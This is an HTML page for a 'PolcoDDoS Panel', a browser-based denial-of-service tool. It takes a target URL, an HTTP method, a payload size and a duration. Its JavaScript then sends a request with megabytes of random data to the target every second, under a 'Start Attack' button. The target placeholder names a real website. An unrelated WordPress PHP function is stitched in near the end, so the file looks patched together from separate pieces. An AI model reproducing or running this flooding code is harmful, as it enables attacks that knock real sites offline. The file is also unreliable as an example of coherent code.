<!DOCTYPE html>
<html>
<head>
    <title>PolcoDDoS</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        .progress-bar::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            background-color: rgba(255, 255, 255, 0.75);
        }
    </style>
</head>

<body class="bg-dark" style="overflow: hidden;">
<div class="container mt-5">
    <div class="row">
        <div class="col-md-12">
            <div class="card border-primary">
                <div class="card-header bg-primary text-light">
                    PolcoDDoS Panel
                </div>

                <div class="card-body">
                    Target:
                    <input type="text" class="form-control" id="target" placeholder="https://www.xhamsterlive.com/" /><br />

                    <div class="row">
                        <div class="col-6">
                            Method:
                            <select id="method" class="form-control">
                                <option value="HEAD">HEAD</option>
                                <option value="GET">GET</option>
                                <option value="POST">POST</option>
                            </select>
                        </div>

                        <div class="col-6">
                            Packet size (MB):
                            <input type="number" value="1" class="form-control" id="size" />
                        </div>
                    </div><br />

                    Duration (in seconds):
                    <input type="number" value="10" class="form-control" id="duration" /><br />

                    <button class="btn btn-success btn-block" id="attack">
                        Start Attack
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="progress" style="height: 30px; display: none;">
    <div id="progressBar" class="progress-bar bg-success" role="progressbar" style="width: 0%;" aria-valuenow="0"
         aria-valuemin="0" aria-valuemax="100"></div>
</div>

<script>
    var DDOS_ATTACK = null;

    function generateRandomPayload(sizeInMB) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const dataSize = sizeInMB * 1024 * 1024;

        let payload = '';
        for (let i = 0; i < dataSize; i++) {
            payload += characters.charAt(Math.floor(Math.random() * characters.length));
        }

        return payload;
    }

    function attack(target, method = "HEAD", sizeInMB = 1, duration = 10) {
        if (DDOS_ATTACK == null) {
            $(".progress").show();

            var startTime = Date.now();
            var endTime = startTime + duration * 1000;
            var progress = 0;

            DDOS_ATTACK = setInterval(function () {
                if (Date.now() > endTime) {
                    clearInterval(DDOS_ATTACK);
                    DDOS_ATTACK = null;
                    $(".progress").hide();
                    $("#progressBar").css("width", "0%");
                    $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
                    return;
                }

                var version = "";
                var payload = generateRandomPayload(sizeInMB);

                var x = new XMLHttpRequest();
                x.open(method, target, true);
                x.send(payload);

                progress = ((Date.now() - startTime) / (endTime - startTime)) * 100;
                $("#progressBar").css("width", progress + "%");
                $("#progressBar").attr("aria-valuenow", progress);
            }, 1000);
        } else {
            clearInterval(DDOS_ATTACK);
            DDOS_ATTACK = null;
            $(".progress").hide();
            $("#progressBar").css("width", "0%");
            $("#attack").removeClass("btn-danger").addClass("btn-success").text("Start Attack");
        }
    }

    $("#attack").on("click", function () {
        var target = $("#target").val();
        var method = $("#method").val();
        var sizeInMB = $("#size").val();
        var duration = $("#duration").val();

        if (target.length < 1) {
            alert("Please enter target");
            return;
        }

        if ($(this).hasClass("btn-success")) {
            $(this).removeClass("btn-success").addClass("btn-danger").text("Stop Attack");
            attack(target, method, sizeInMB, duration);
        } else {
            $(this).removeClass("btn-danger").addClass("btn-success").text("Start Attack");
            clearInterval(DDOS_ATTACK);
            DDOS_ATTACK = null;
            $(".progress").hide();
            $("#progressBar").css("width", "0%");
        }
    });
</script>
<?php
function delete_post_meta( $post_id, $meta_key, $meta_value = '' ) {
	// Make sure meta is deleted from the post, not from a revision.
	$the_post = wp_is_post_revision( $post_id );
	if ( $the_post ) {
		$post_id = $the_post;
	}

	return delete_metadata( 'post', $post_id, $meta_key, $meta_value );
}
?>
</body>
</html>